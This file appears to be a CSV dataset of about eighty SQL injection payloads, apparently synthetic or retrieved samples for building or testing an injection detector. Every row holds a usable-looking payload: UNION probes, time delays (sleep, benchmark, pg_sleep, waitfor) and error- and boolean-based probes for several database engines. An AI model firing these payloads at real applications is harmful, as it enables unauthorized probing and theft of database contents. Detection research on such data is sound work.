id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_001679,attack,union,"1""  )   as qwyt where 4236  =  4236 union all select null,null,null,null,null--",nearest_attack_euclidean,R005473,4.611763210974412
CTGAN_001680,attack,time,"1',  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",nearest_attack_euclidean,R006753,8.397790899797666
CTGAN_001681,attack,time,"1'   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R008718,4.156282404004616
CTGAN_001682,attack,boolean,"1'||  (  select 'ggfx' where 4932  =  4932 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   ||'",nearest_attack_euclidean,R001901,5.790999882444542
CTGAN_001683,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R003399,5.270294551281267
CTGAN_001684,attack,other,end# ckxq,nearest_attack_euclidean,R003895,3.3734463329470463
CTGAN_001685,attack,boolean,"1'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'vwtq'  =  'vwtq",nearest_attack_euclidean,R008065,4.540322716821581
CTGAN_001686,attack,boolean,-4313%'  )   or 6872  =  6872 and   (  '%'  =  ',nearest_attack_euclidean,R005776,1.9954147217955402
CTGAN_001687,attack,boolean,"-2745' or elt  (  1032  =  1032,3623  )  ",nearest_attack_euclidean,R006963,1.6579166351550056
CTGAN_001688,attack,boolean,"1'   )    )    as fjbe where 4662  =  4662 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R005263,3.963162224279746
CTGAN_001689,attack,boolean,"1""  )   where 9295  =  9295 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R006073,4.35604911625664
CTGAN_001690,attack,time,"1""   )    )    as nsbu where 6569  =  6569 or sleep  (  5  )  #",nearest_attack_euclidean,R005065,2.727215435671879
CTGAN_001691,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000701,2.3362413537980817
CTGAN_001692,attack,other,1   )    )    as mlpf where 7425  =  7425,nearest_attack_euclidean,R001024,2.666063545624972
CTGAN_001693,attack,boolean,-7279  )   or 9898  =  9963 and   (  1481  =  1481,nearest_attack_euclidean,R002855,2.4369113209058164
CTGAN_001694,attack,time,"1,  (  select   (  case when   (  1609  =  1609  )   then waitfor delay '0:0:5' else 1609*  (  select 1609 from master..sysdatabases  )   end   )    )   ",nearest_attack_euclidean,R002555,4.949728245493605
CTGAN_001695,attack,boolean,"1%"" and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R003107,4.579616466014983
CTGAN_001696,attack,union,"-6389"" union all select 2355,2355,2355,2355,2355--",nearest_attack_euclidean,R002110,3.579479209101249
CTGAN_001697,attack,other,%7C,nearest_attack_euclidean,R009038,7.153356563122193
CTGAN_001698,attack,other,select   (  case when   (  3773  =  3722  )   then 3773 else 3773*  (  select 3773 from mysql.db  )   end  )  #,nearest_attack_euclidean,R008482,4.085004773264869
CTGAN_001699,attack,time,"1   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  8671  =  8671",nearest_attack_euclidean,R002369,6.225957721085206
CTGAN_001700,attack,other,1'||  (  select 'cfff' where 4994  =  4994,nearest_attack_euclidean,R001799,2.0254821911332117
CTGAN_001701,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R001680,3.4588599892193663
CTGAN_001702,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000701,4.201854634222952
CTGAN_001703,attack,union,"1%""  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R007275,2.6865461035072267
CTGAN_001704,attack,boolean,1 and user_name  (    )     =   'dbo',nearest_attack_euclidean,R000079,3.1529426332645722
CTGAN_001705,attack,time,"1',  (  select   (  case when   (  1570  =  1570  )   then   (  select 1570 from pg_sleep  (  5   )    )    else 1/  (  select 0  )   end   )    )   ",nearest_attack_euclidean,R008435,10.252493343521957
CTGAN_001706,attack,boolean,"1'   )    )    as gqzy where 2312  =  2312 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R007542,2.7953602183568416
CTGAN_001707,attack,union,"-8999"" where 2821  =  2821 union all select 2821,2821,2821,2821,2821,2821,2821,2821#",nearest_attack_euclidean,R008006,3.4301886912902226
CTGAN_001708,attack,other,1  )   as hggi where 6511  =  6511,nearest_attack_euclidean,R002700,1.0237665036768329
CTGAN_001709,attack,boolean," end and    (    (     (  ""zpii"" like ""zpii",nearest_attack_euclidean,R001994,3.3546055960882963
CTGAN_001710,attack,boolean,-8051  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  5637  =  5637,nearest_attack_euclidean,R006274,3.52260289414753
CTGAN_001711,attack,union,"-3960""   )    )    union all select 7813,7813,7813,7813,7813,7813--",nearest_attack_euclidean,R008354,5.667829460253928
CTGAN_001712,attack,time,"1""   )    )     )   and sleep  (  5  )   and    (    (     (  ""fdvc"" like ""fdvc",nearest_attack_euclidean,R005546,3.9238422681506555
CTGAN_001713,attack,union,"-3205""  )   union all select 5233,5233,5233,5233#",nearest_attack_euclidean,R006281,4.225703562400951
CTGAN_001714,attack,boolean,"1 and make_set  (  6911  =  1867,1867  )  ",nearest_attack_euclidean,R006866,2.941008557704454
CTGAN_001715,attack,boolean,"1%' and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R006362,3.3142709753540567
CTGAN_001716,attack,boolean,"1'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  'zxon' like 'zxon",nearest_attack_euclidean,R004352,1.9402500644707985
CTGAN_001717,attack,boolean,"1'  )   where 3330  =  3330 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R008378,2.3236207971040845
CTGAN_001718,attack,union,union select * from users where login   =   char ...,nearest_attack_euclidean,R000155,5.344988111305286
CTGAN_001719,attack,boolean,"1'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'zcey'  =  'zcey",nearest_attack_euclidean,R008492,3.7775564266698876
CTGAN_001720,attack,union,"-1868   )    )    union all select 1859,1859--",nearest_attack_euclidean,R003979,3.5185635807781934
CTGAN_001721,attack,union,"1""   )    )    as yfpl where 4820  =  4820 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R007887,7.128499955497636
CTGAN_001722,attack,boolean,end and   (  'uxzv'  =  'uxzv,nearest_attack_euclidean,R007313,2.9528655173272007
CTGAN_001723,attack,error,"1"" procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and ""acbq"" like ""acbq",nearest_attack_euclidean,R007993,3.6265613557097702
CTGAN_001724,attack,error,1  )   as nbno where 9816  =  9816 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,nearest_attack_euclidean,R004119,4.194186481260781
CTGAN_001725,attack,union,"-4756""   )    )    union all select 6846,6846,6846,6846,6846,6846,6846#",nearest_attack_euclidean,R007646,3.216293567878709
CTGAN_001726,attack,other,select 'qqpjq'||  (  case 5118 when 5118 then 1 else 0 end  )  ||'qzvzq' from rdb$database,nearest_attack_euclidean,R004669,2.883596562368034
CTGAN_001727,attack,boolean,"1  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  5132  =  5132",nearest_attack_euclidean,R005402,3.485162882469671
CTGAN_001728,attack,error,"1'||  (  select 'txyy' where 6500  =  6500 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   ||'",nearest_attack_euclidean,R003115,3.4172445055716447
CTGAN_001729,attack,other,select   (  case when   (  9376  =  4521  )   then 1 else 9376*  (  select 9376 from master..sysdatabases  )   end  )  --,nearest_attack_euclidean,R006737,4.578534086575352
CTGAN_001730,attack,union,"-3719"" union all select 6609,6609,6609,6609#",nearest_attack_euclidean,R003500,2.2239137822865938
CTGAN_001731,attack,boolean,"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",nearest_attack_euclidean,R008073,2.5037522304658486
CTGAN_001732,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'qfsu'  =  'qfsu",nearest_attack_euclidean,R002272,2.555937522907954
CTGAN_001733,attack,error,"1'   )    )    as kfnt where 8090  =  8090 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",nearest_attack_euclidean,R007987,3.428409715544126
CTGAN_001734,attack,boolean,"1   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  8738  =  8738",nearest_attack_euclidean,R002000,2.7750153980389887
CTGAN_001735,attack,time,"1',  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",nearest_attack_euclidean,R006753,20.652128994093854
CTGAN_001736,attack,boolean,"1'   )    )    as babx where 2494  =  2494 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R004101,2.4866935564590076
CTGAN_001737,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null#",nearest_attack_euclidean,R006831,4.088335703602609
CTGAN_001738,attack,boolean,"1'   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'nqam'  =  'nqam",nearest_attack_euclidean,R005695,2.5071969912366083
CTGAN_001739,attack,union,union select * from users where login   =   char ...,nearest_attack_euclidean,R000155,7.2879137209926235
CTGAN_001740,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R001072,3.6384571463552837
CTGAN_001741,attack,time,1'   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  'ineq' like 'ineq,nearest_attack_euclidean,R002977,3.691817382957193
CTGAN_001742,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R002133,5.036241090769035
CTGAN_001743,attack,boolean,"1'   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  'owot'  =  'owot",nearest_attack_euclidean,R001364,2.8811332377166003
CTGAN_001744,attack,union,"1""  )   as xwnu where 6490  =  6490 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R005957,2.6379953484922662
CTGAN_001745,attack,error,"1',updatexml  (  2917,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  2917  =  2917,1   )    )     )  ,0x717a767a71  )  ,8295  )  ",nearest_attack_euclidean,R004158,2.949362243288486
CTGAN_001746,attack,boolean,1 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,nearest_attack_euclidean,R007736,3.738904771023942
CTGAN_001747,attack,other,"1""   )    )    as irrz where 8730  =  8730 order by 1#",nearest_attack_euclidean,R004807,3.537333160484566
CTGAN_001748,attack,time,"select sleep  (  5  )   and   (  ""%""  =  """,nearest_attack_euclidean,R001838,3.0410990948207193
CTGAN_001749,attack,error,"1  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R001465,2.578207135587088
CTGAN_001750,attack,time,"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R004936,3.721528370722365
CTGAN_001751,attack,error,"-8410"" or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""xhzr""  =  ""xhzr",nearest_attack_euclidean,R001383,3.9853745328790344
CTGAN_001752,attack,time,1'   )    )    and sleep  (  5  )   and    (    (   'krrr'  =  'krrr,nearest_attack_euclidean,R006082,4.111260797463837
CTGAN_001753,attack,other,"1'||  (  select 'djoe' from dual where 8063  =  8063   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )      )    )   ||'",nearest_attack_euclidean,R007544,12.578798948633523
CTGAN_001754,attack,other,1'  )   as pudv where 2609  =  2609,nearest_attack_euclidean,R002866,1.4338437815073555
CTGAN_001755,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R001214,3.682324943516261
CTGAN_001756,attack,boolean,"-7851""   )    )    or 6872  =  6872 and    (    (   ""dvbw"" like ""dvbw",nearest_attack_euclidean,R008464,3.661598720894147
CTGAN_001757,attack,boolean,"1 where 6221  =  6221 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R003743,1.0710500618686365
CTGAN_001758,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  # gkkx,nearest_attack_euclidean,R005427,3.9687816287294
CTGAN_001759,attack,error,"1'||  (  select 'adiv' from dual where 9842  =  9842 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||'",nearest_attack_euclidean,R003996,4.527725699630022
CTGAN_001760,attack,error,"1'||  (  select 'adiv' from dual where 9842  =  9842 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||'",nearest_attack_euclidean,R003996,3.864025761528991
CTGAN_001761,attack,boolean,1'  )   and 2305  =  1934,nearest_attack_euclidean,R006483,1.3300882111650394
CTGAN_001762,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  'ckpm'  =  'ckpm",nearest_attack_euclidean,R006160,3.6507302730542865
